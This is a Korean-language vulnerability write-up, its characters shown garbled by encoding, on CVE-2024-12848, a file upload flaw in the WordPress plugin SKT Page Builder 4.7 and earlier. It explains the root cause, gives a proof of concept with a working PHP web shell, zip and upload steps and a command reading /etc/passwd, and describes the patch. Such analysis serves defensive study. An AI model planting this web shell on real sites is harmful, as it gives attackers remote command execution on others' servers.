---
title: "[CVE-2024-12848] ì·¨ì•½ì  ë¶„ì„ ë³´ê³ ì„œ"
description: "WordPress í”ŒëŸ¬ê·¸ì¸ SKT Page Builderì˜ 4.7 ë²„ì „ ì´í•˜ì—ì„œ ë°œê²¬ëœ ì„ì˜ íŒŒì¼ ì—…ë¡œë“œ ì·¨ì•½ì "
author: dottak
date: 2025-01-13 14:24:00 +0900
categories: [One-Day ë¶„ì„, WordPress]
tags: [ë¹¡ê³µíŒŸ, ì½˜í…ŒìŠ¤íŠ¸ ë„¤ë·¸ë¼, CVE, CVE-2024-12848, File Upload]
image: assets/img/wordpress-thumbnail.png
exclude_img: true
---

## ğŸ“Œ Analysis

### 1. ê°œìš”

`CVE-2024-12848` ì·¨ì•½ì ì€ WordPress í”ŒëŸ¬ê·¸ì¸ SKT Page Builderì˜ 4.7 ë²„ì „ ì´í•˜ì—ì„œ ë°œê²¬ëœ ì„ì˜ íŒŒì¼ ì—…ë¡œë“œ ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ SKT Page Builder í”ŒëŸ¬ê·¸ì¸ ëŒ€ì‹œë³´ë“œì˜ 'Manage Libraries' ë©”ë‰´ì—ì„œ ë¼ì´ë¸ŒëŸ¬ë¦¬ ì—…ë¡œë“œ ì‹œ ë°œìƒí•©ë‹ˆë‹¤.

ì·¨ì•½ì ì€ íŒŒì¼ ì—…ë¡œë“œ ì²˜ë¦¬ ì¤‘ `addLibraryByArchive` í•¨ìˆ˜ê°€ íŒŒì¼ í™•ì¥ì í•„í„°ë§ì„ ì œëŒ€ë¡œ ìˆ˜í–‰í•˜ì§€ ì•Šì•„ ë°œìƒí–ˆìŠµë‹ˆë‹¤. ì´ë¡œ ì¸í•´ êµ¬ë…ì(Subscriber) ì´ìƒì˜ ê¶Œí•œì„ ê°€ì§„ ì¸ì¦ëœ ì‚¬ìš©ìê°€ ì›¹ ì‰˜ê³¼ ê°™ì€ ì•…ì„± íŒŒì¼ì„ ì—…ë¡œë“œí•˜ì—¬ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 2. ì·¨ì•½ì  ë¶„ì„

ì·¨ì•½ì ì´ íŠ¸ë¦¬ê±°ë˜ëŠ” í˜ì´ì§€ëŠ” SKT Builder í”ŒëŸ¬ê·¸ì¸ ëŒ€ì‹œë³´ë“œì˜ â€˜Manage Librariesâ€™ ë©”ë‰´(`/wp-admin/admin.php?page=sktbuilder-manage-libs`) ì…ë‹ˆë‹¤.

![image](assets/posts/one-day/2025-01-13/image001.png)

í•´ë‹¹ ë©”ë‰´ì—ì„œ â€˜Upload a SKT Builder libraryâ€™ë¥¼ ì„ íƒí•˜ê³  â€˜Add Libraryâ€™ ë²„íŠ¼ì„ í´ë¦­í•˜ì—¬ íŒŒì¼ì„ ì—…ë¡œë“œí•˜ë©´ `/wp-content/plugins/skt-builder.4.7/sktbuilder.php` íŒŒì¼ ë‚´ `Sktbuilder` í´ë˜ìŠ¤ì˜ `addNewLib` í•¨ìˆ˜ê°€ í˜¸ì¶œë©ë‹ˆë‹¤. 

ì´í›„ í•´ë‹¹ í•¨ìˆ˜ëŠ” íŒŒì¼ ì—…ë¡œë“œ ì²˜ë¦¬ë¥¼ ìœ„í•´ ìš”ì²­ ë°›ì€ íŒŒì¼ ë°ì´í„° `$_FILES['lib_file']` ë¥¼ í•¨ìˆ˜ `addLibraryByArchive` ì˜ ì¸ìë¡œ ì „ë‹¬í•˜ê²Œ ë©ë‹ˆë‹¤.

![image](assets/posts/one-day/2025-01-13/image002.png)

ì´ì–´ì„œ í•¨ìˆ˜ `addLibraryByArchive` ëŠ” ì „ë‹¬ë°›ì€ íŒŒì¼ ë°ì´í„° `$_FILES['lib_file']` ì˜ íŒŒì¼ í™•ì¥ìê°€ ì••ì¶• íŒŒì¼(`application/zip`)ì¸ì§€ í•„í„°ë§ì„ ìˆ˜í–‰í•˜ê³  ìˆìŠµë‹ˆë‹¤.

ì´í›„ í•´ë‹¹ ì••ì¶• íŒŒì¼ì„ `unzip_file` í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ `$upload_dir` ê²½ë¡œì— ì••ì¶• í•´ì œë¥¼ ìˆ˜í–‰í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ë•Œ, ì••ì¶• í•´ì œëœ íŒŒì¼ì— ëŒ€í•œ íŒŒì¼ í™•ì¥ì í•„í„°ë§ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ ì••ì¶• íŒŒì¼ ë‚´ë¶€ì— PHP ì›¹ ì‰˜ê³¼ ê°™ì€ ì•…ì„± íŒŒì¼ì„ í¬í•¨ì‹œì¼œ ì—…ë¡œë“œê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. 

![image](assets/posts/one-day/2025-01-13/image003.png)

## ğŸ“Œ PoC

### 1. ì›¹ ì‰˜(WebShell) ì¤€ë¹„

ì•„ë˜ì˜ ì½”ë“œë¥¼ ê°€ì§€ëŠ” PHP ì›¹ ì‰˜ íŒŒì¼(`webshell.php`)ì„ ìƒì„±í•©ë‹ˆë‹¤.

```php
<?php
    if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
    }
?>
```

![image](assets/posts/one-day/2025-01-13/image004.png)

### 2. ì›¹ ì‰˜(WebShell) ì••ì¶• í•˜ê¸°

ì´í›„ ìƒì„±í•œ PHP íŒŒì¼ì„ ì••ì¶•í•˜ì—¬ ZIP íŒŒì¼ë¡œ ë§Œë“­ë‹ˆë‹¤.

```bash
zip webshell.zip webshell.php # íŒŒì¼ ì••ì¶•
zip -sf webshell.zip # ì••ì¶•ëœ íŒŒì¼ í™•ì¸
```

![image](assets/posts/one-day/2025-01-13/image005.png)

### 3. ì›¹ ì‰˜ ì—…ë¡œë“œ

SKT Builder í”ŒëŸ¬ê·¸ì¸ ëŒ€ì‹œë³´ë“œ â€˜Manage Librariesâ€™ ë©”ë‰´(`/wp-admin/admin.php?page=sktbuilder-manage-libs`)ë¡œ ì´ë™í•œ ë’¤ ì•„ë˜ì™€ ê°™ì´ ì••ì¶•í•œ ì›¹ ì‰˜ íŒŒì¼(`webshell.zip`)ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤.

![image](assets/posts/one-day/2025-01-13/image006.png)

ê·¸ëŸ¼ HTTP ìš”ì²­ íŒ¨í‚·ì´ ì•„ë˜ì™€ ê°™ì´ ì „ì†¡ë©ë‹ˆë‹¤.

![image](assets/posts/one-day/2025-01-13/image007.png)

### 4. ì›¹ ì‰˜ í™•ì¸

ì´í›„ SKT Builder í”ŒëŸ¬ê·¸ì¸ì˜ ì—…ë¡œë“œ ë””ë ‰í„°ë¦¬(`/wp-content/uploads/sktbuilder/`)ë¥¼ ë³´ë©´ ì•„ë˜ì™€ ê°™ì´ ì›¹ ì‰˜ì´ ì •ìƒì ìœ¼ë¡œ ì••ì¶• í•´ì œë˜ì–´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](assets/posts/one-day/2025-01-13/image008.png)

ê·¸ ë‹¤ìŒ ë¸Œë¼ìš°ì €ë¥¼ í†µí•´ ì›¹ ì‰˜ì´ ì—…ë¡œë“œëœ ê²½ë¡œë¥¼ ìš”ì²­í•˜ë©´ URL íŒŒë¼ë¯¸í„° `cmd` ë¡œ ì „ë‹¬ëœ ë°ì´í„°ê°€ ì‹œìŠ¤í…œ ëª…ë ¹ì–´ë¡œ ì „ë‹¬ë˜ì–´ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ í™•ì¸í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
/wp-content/uploads/sktbuilder/webshell.php?cmd=cat+/etc/passwd
```

![image](assets/posts/one-day/2025-01-13/image009.png)

## ğŸ“Œ íŒ¨ì¹˜ í™•ì¸

íŒ¨ì¹˜ëœ ë²„ì „ì—ì„œëŠ” ì••ì¶• íŒŒì¼ì„ í•´ì œí•œ ë‹¤ìŒ ì••ì¶• í•´ì œëœ íŒŒì¼ë“¤ì˜ í™•ì¥ìë¥¼ ê²€ì‚¬í•˜ì—¬ `.json` í™•ì¥ìë¥¼ ê°€ì§„ íŒŒì¼ë§Œ ì—…ë¡œë“œë˜ë„ë¡ ì œí•œí•˜ê³  ìˆìŠµë‹ˆë‹¤.

> https://plugins.trac.wordpress.org/changeset/3213786/skt-builder/trunk/sktbuilder.php#file0
> 

![image](assets/posts/one-day/2025-01-13/image010.png)